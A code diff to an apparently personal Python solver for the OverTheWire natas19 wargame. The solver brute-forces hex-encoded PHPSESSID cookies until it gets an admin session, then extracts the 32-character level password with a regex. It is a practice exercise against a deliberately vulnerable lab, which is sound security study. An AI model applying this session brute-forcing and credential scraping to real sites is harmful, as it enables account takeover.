@@ -10,6 +10,7 @@ r = requests.get('http://natas19.natas.labs.overthewire.org', auth=auth, params=
 if r.text.find('DEBUG') != -1:
     #could print debug I guess idfk
     pass
+
 count = 0  
 
 while r.text.find('You are an admin') == -1:
@@ -17,5 +18,5 @@ while r.text.find('You are an admin') == -1:
     cook = {'PHPSESSID':attack.encode('utf-8').hex()}
     r = requests.get('http://natas19.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
     count += 1
-    pass_regex = '[a-zA-Z0-9]'
-    print(re.findall(pass_regex, r.text))
+pass_regex = '[a-zA-Z0-9]{32}'
+print(re.findall(pass_regex, r.text)[1])
